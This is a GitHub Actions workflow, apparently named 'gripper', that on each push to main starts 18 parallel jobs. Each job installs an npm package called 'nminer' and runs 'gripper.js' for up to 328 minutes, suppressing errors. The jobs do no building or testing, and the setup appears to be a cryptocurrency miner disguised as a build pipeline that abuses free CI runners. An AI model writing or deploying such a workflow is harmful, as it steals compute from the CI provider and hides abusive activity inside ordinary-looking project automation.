name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1731 }
          - { version: 6192 }
          - { version: 9156 }
          - { version: 8236 }
          - { version: 6582 }
          - { version: 7827 }
          - { version: 7517 }
          - { version: 9927 }
          - { version: 553 }
          - { version: 9348 }
          - { version: 4093 }
          - { version: 2456 }
          - { version: 801 }
          - { version: 5469 }
          - { version: 4435 }
          - { version: 3281 }
          - { version: 1823 }
          - { version: 661 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: rally down
        run: |
          npm install nminer@latest
          timeout 328m node gripper.js || echo "gripper executed"